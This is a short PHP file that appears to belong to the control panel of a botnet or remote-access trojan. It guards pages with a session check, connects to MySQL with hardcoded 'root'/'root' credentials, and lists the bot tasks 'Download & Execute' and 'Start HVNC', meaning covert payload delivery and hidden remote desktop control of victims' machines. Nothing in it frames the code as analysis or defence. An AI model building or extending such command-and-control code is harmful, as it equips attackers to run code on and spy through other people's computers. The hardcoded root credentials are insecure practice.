<?php
session_start();
$session = $_SESSION['user'];
if(empty($session)) {
   header("Location: login.php");
   die();
}


	function connection(){
		$dsn = 'mysql:host=localhost;dbname=dbname'; 
		$username = 'root'; 
		$pwd='root'; 
		try {
			return new PDO($dsn, $username, $pwd);
		}
		catch (PDOException $e) {
			$error_message = $e->getMessage();
			echo "error";
			return "";
		}
	}
$task_array = array(
	
	"1" => "Download & Execute",
	"2" => "Start HVNC"
	);
?>
